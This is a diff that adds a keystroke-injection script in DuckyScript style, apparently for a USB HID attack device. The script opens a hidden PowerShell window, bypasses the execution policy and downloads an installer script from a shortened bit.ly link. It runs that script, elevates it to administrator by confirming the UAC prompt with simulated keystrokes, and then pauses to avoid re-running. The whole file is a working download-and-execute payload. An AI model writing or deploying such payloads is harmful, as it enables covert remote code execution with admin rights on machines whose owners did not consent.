@@ -1,0 +1,15 @@
+REM Starting a hidden administrator instance of powershell to run the entire script.
+GUI r
+DELAY 1500
+STRING powershell -w hidden Set-ExecutionPolicy Bypass -Scope Process -Force; Set-Location (gi $env:temp).fullname; Invoke-WebRequest -URI 'https://bit.ly/TinyPicoInstaller' -OutFile 'installer.ps1'; & '.\installer.ps1'
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 4000
+ALT TAB
+DELAY 1000
+ALT SHIFT TAB
+DELAY 500
+ALT y
+
+REM Pausing the program to prevent re-run.
+DELAY 900000
